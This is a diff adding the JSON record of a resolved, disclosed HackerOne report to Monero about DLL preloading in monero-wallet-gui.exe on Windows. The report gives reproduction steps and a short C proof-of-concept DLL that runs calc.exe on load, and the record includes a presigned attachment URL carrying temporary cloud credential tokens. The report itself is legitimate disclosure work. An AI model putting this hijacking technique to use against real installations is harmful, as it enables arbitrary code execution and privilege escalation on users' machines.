@@ -1,0 +1,116 @@
+{
+  "id": 896338,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTYzMzg=",
+  "url": "https://hackerone.com/reports/896338",
+  "title": "Misconfiguration in build environment allows DLL preloading attack",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-11T20:59:35.213Z",
+  "submitted_at": "2020-06-11T20:59:35.213Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nim4",
+    "url": "/nim4",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-01-29T17:08:01.081Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-12-30T17:07:58.256Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n`monero-wallet-gui.exe` tries to dynamically load some dynamic link libraries(DLL) which are not present in the applications directory, so `LoadLibraryA` system-call will search other directories such as Windows root and %PATH% for them. An attacker can gain arbitrary code execution if he/she has write permission to any of the directories within the `%PATH%`.\n\nList of DDLs:\n- `ZLIB1.dll` \n- `perf.dll` loaded by `atio6axx.dll` (AMD OpenGL)\n\n## Releases Affected:\n\nTried on `v0.16.0.0` on Windows 10 Home Edition with AMD GPU\n\n## Steps To Reproduce:\n\n  1.  Create a DLL and put the exploit in `DLL_PROCESS_ATTACH` event.\n  2. Rename the DLL to `ZLIB1.dll`\n  3. Copy the DLL to any directory in the path(`echo %PATH%`)\n  4. Run `monero-wallet-gui.exe`\n\n## Supporting Material/References:\n\nPoC DLL:\n```\n#include <windows.h>\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)\n{\n    switch(fdwReason)\n    {\n        case DLL_PROCESS_ATTACH:\n            system(\"cmd /Q /D /C calc.exe\");\n        case DLL_PROCESS_DETACH:\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n            break;\n    }\n    \n    return TRUE;\n}\n```\n\n## Housekeeping\n\nAddress: 8C5XAD3aAH9CfwCh7M8vhXgzyLPCLQTPWJk6nXnxGPpH2dGfEShuWWzdXqz92tWu2874A13BEwp6SeGhWK6MAJzvKCxZW4L\n\n## Impact\n\nArbitrary code execution and  privilege escalation",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 864652,
+      "file_name": "poc.mkv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kpLLNPSJ7U2ozVab4KqRrGci?response-content-disposition=attachment%3B%20filename%3D%22poc.mkv%22%3B%20filename%2A%3DUTF-8%27%27poc.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV6PJB7MP%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T003400Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQCtf6vTXyH8%2Bozi0RYXyWxDGS6UKXEOlhZOs%2Bc7N1%2BnlQIgDxFPfPulSkPNL5xmf7rLy5YJAHXWAB9ZZa%2Bdc3emI60quwUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLV%2Byc0OmGY5uWaZKiqPBS1vWopbXFrNrUeFYU1ggCTbW9fb8tA7cW7ci%2BdG9hPAJZ2AVTVHttMkHp7jnljQ6bHYxyYQ6oTXJQvY50wdEtot65T3%2BIdqlBi%2FTsGnJHoZNhzxb6qyRbxOpa9Li7IkYnPMwUPgR%2FJZOfVYinqcHvlMNOAWe5eVJuBaaRQ7CQ4iA2iTBujeCcGFi73Db055vyweW7Dy4ducSVDYL%2BV4p4kbcY6yNawfPiZBRBTqjjvs112WeUkw1J9iVZXtelLZPk1L1GM6C4YPdkKvTiNTQmF4tIwIcPf6c2yVIXs%2FPbzLz3ykydl3ZMTIxa6eT7waCRHX9ZS4wZg5DeoHpTyfHnjRErf6vVXb7l8xvNHfBKGNlYffMqRZlA30kaPj84EwTUcA9G3N42RItqBmsAFq6kHbQakld%2BWpEXOWAQMA79g3DyelksPYTGmEpfpphDRSNej6QbeDO3h14quanB%2Fq1Ddk9va95%2Br3DX8mZzRkGdZyYG5CXUkCy%2FBYi4TPQLvHidsgUL7HrBi9kqsdfKqPAyx8vJOiZ63Trzxac7bOPtfOEo9wtkF3X34OjVoQACZl05wGygM61lNDLrqRQ8qQt27nnwa7ZYuDa1YB45WACQieX814hFpkqMRP9Dzhp%2FljK7LpF7V05rBlysyL2ZGe%2BSnenMMKvR6IHjUppXxctqT2V5U7OPa5XSSysg5fvX2xziTlDLKb9XmjzXO6N16kA9c0YsM1CpBgx6ZpLUCztzKFDr%2FH95ulT%2F0LaFeUgftliewcn95RD2ksQgSLwMmOQbBvx4h%2B%2BNkKIsa%2F4vrWcz27%2Fh%2FL%2Ft2t2tr3BLs%2FD9RF5UH6ZxdrS2ARUFHT64biddhBOsaJQUOd1lcsEJ8%2FOkswxLG8xgY6sQGDSxPqhf8Set6IXO2TONDp%2BOXEYxIgC4S%2FOYip794wkSGxQ4WlMvlEgBD%2Btg0KXw3kw9UnXQVaJkvdXskQQU9w3fEtycBWQ1UcsQmEprgvQ3kdYHDM%2BjQjx%2Ba8R0qs4qHUetlphHFu3vqQ%2B8XP79pX%2FYfz31U%2FeHq09fH%2F1gGcNcjF3Ed73czv1thTVxCWZiIs3G1isuUvpONXJlddE%2FULYK4zZ4lpr4CLcF94svtFFIk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=968eb73159140b8ccd7f92e8529ad2d7c3378e969e3d8d6a7cbb05bb03cbc47a",
+      "file_size": 942207,
+      "type": "video/x-matroska",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-01-29T17:07:58.355Z",
+  "allow_singular_disclosure_after": -114938762.36748168,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "scarecow",
+    "tess",
+    "ibring",
+    "zelenskyy",
+    "hama122"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
